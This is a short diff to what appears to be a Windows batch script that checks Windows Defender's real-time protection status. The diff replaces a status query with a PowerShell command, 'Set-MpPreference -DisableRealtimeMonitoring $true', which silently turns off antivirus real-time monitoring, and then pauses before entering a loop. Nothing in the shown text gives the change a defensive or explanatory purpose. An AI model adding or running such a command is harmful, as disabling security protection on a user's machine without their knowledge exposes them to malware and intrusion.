@@ -15,7 +15,9 @@ for /f %%A in ('powershell -NoProfile -Command "(Get-MpComputerStatus).RealTimeP
     set "status=%%A"
 )
 
-for /f %%A in ('powershell -Command "(Get-MpComputerStatus).RealTimeProtectionEnabled"') do set status=%%A
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
+
+timeout /t 5 > nul
 
 :repeat
 
